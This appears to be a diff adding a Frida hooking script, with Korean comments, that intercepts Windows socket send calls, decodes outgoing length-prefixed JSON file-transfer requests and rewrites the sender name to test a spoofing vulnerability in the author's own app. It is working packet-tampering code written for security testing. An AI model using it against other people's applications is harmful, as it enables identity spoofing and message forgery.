@@ -1,0 +1,78 @@
+// frida_send_hacker.js (내 컴퓨터에서 나가는 패킷 조작용)
+
+// Windows 환경의 표준 소켓 송신 API(send)를 찾아 후킹합니다.
+const sendAddr = Module.findExportByName("ws2_32.dll", "send");
+
+if (sendAddr) {
+    Interceptor.attach(sendAddr, {
+        onEnter: function (args) {
+            // args[1] = 송신 버퍼 주소, args[2] = 송신할 바이트 크기
+            this.buf = args[1];
+            this.len = args[2].toInt32();
+
+            // 최소한의 헤더(4바이트)와 JSON 구조가 들어올 수 있는 크기인지 체크
+            if (this.len > 4) {
+                try {
+                    // 1. 프로토콜 분석: 앞의 4바이트 Big-Endian 길이 읽기
+                    const lenHeader = this.buf.readByteArray(4);
+                    const view = new DataView(lenHeader);
+                    const jsonLength = view.getUint32(0, false); // false = Big Endian
+
+                    // 명시된 JSON 길이가 송신 크기 범위 내에 있는지 검증
+                    if (jsonLength > 0 && jsonLength <= this.len - 4) {
+                        // 2. JSON 데이터 영역 추출 및 문자열 변환
+                        const jsonBytes = this.buf.add(4).readByteArray(jsonLength);
+                        const uint8Array = new Uint8Array(jsonBytes);
+                        
+                        let jsonStr = "";
+                        for (let i = 0; i < uint8Array.length; i++) {
+                            jsonStr += String.fromCharCode(uint8Array[i]);
+                        }
+
+                        // 3. 내 앱이 전송하려는 T_REQUEST(파일 전송 요청) 패킷인지 필터링
+                        if (jsonStr.trim().startsWith("{") && jsonStr.includes('"type"') && jsonStr.includes('"request"')) {
+                            let payload = JSON.parse(jsonStr);
+                            
+                            console.log("\n[+] [송신 가로채기 완료] 내 앱이 내보내려던 원본 패킷:");
+                            console.log(JSON.stringify(payload, null, 2));
+
+                            // 4. 취약점 #6 검증: 이름(name)을 '홍길동'으로 강제 조작
+                            payload["name"] = "홍길동";
+
+                            // 5. 패킷 재조립 (한글 UTF-8 인코딩 처리)
+                            const newJsonStr = JSON.stringify(payload);
+                            
+                            // 프리다 내장 기능을 이용해 UTF-8 바이트 배열로 변환
+                            const newJsonBytes = Memory.allocUtf8String(newJsonStr).readByteArray(Blob.proxy(newJsonStr).size);
+                            const newLength = Blob.proxy(newJsonStr).size;
+
+                            // 6. 새 길이 헤더 생성 (Big Endian)
+                            const newHeader = new Uint8Array(4);
+                            const newHeaderView = new DataView(newHeader.buffer);
+                            newHeaderView.setUint32(0, newLength, false);
+
+                            // 7. 새로운 패킷을 임시 메모리에 조립한 뒤 원래 버퍼에 안전하게 덮어쓰기
+                            // (새 이름 주입으로 전체 패킷이 약간 늘어날 수 있으므로 메모리를 새로 할당해서 교체합니다)
+                            const hackBuffer = Memory.alloc(4 + newLength);
+                            hackBuffer.writeByteArray(newHeader.buffer);
+                            hackBuffer.add(4).writeByteArray(newJsonBytes);
+
+                            // 원래 send 함수의 인자 값들을 가공된 가짜 데이터 주소와 크기로 최종 변환
+                            args[1] = hackBuffer; // 버퍼 주소 변경
+                            args[2] = ptr(4 + newLength); // 보낼 크기(인자) 변경
+
+                            console.log("[*] [변조 및 발송 대기] 이름을 '홍길동'으로 조작하여 송신합니다.");
+                            console.log("-> 조작된 실제 송신 패킷: " + newJsonStr);
+                        }
+                    }
+                } catch (e) {
+                    // 이미지 청크나 파일 데이터 구간(Raw bytes) 통과 시 에러 무시
+                    // console.log("[-] 데이터 가공 스킵: " + e);
+                }
+            }
+        }
+    });
+    console.log("[*] ws2_32.dll!send 후킹에 성공했습니다. 내 앱에서 파일 전송을 시도하세요.");
+} else {
+    console.log("[-] 표준 소켓 라이브러리(ws2_32.dll)의 send 함수를 찾지 못했습니다.");
+}
